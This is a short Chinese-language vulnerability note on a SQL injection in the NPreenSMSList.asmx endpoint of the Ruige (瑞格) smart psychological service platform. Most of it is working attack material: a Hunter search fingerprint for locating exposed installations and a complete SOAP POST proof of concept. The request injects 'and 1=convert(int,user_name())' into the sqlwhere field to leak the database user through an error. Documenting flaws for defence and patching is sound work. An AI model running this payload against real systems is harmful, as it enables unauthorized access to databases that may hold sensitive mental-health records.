# 瑞格智慧心理服务平台NPreenSMSList.asmx存在sql注入漏洞

瑞格智慧心理服务平台NPreenSMSList.asmx存在sql注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## hunter

```javascript
web.body="瑞格智慧心理服务平台"
```

## poc

```javascript
POST /NPreenManage/NPreenSMSList.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "RuiGe.WebUi.NPreenSMS/Seach"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Seach xmlns="RuiGe.WebUi.NPreenSMS">
      <sqlwhere>and 1=convert(int,user_name())</sqlwhere>
    </Seach>
  </soap:Body>
</soap:Envelope>
```

![image-20241020214327143](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410202143216.png)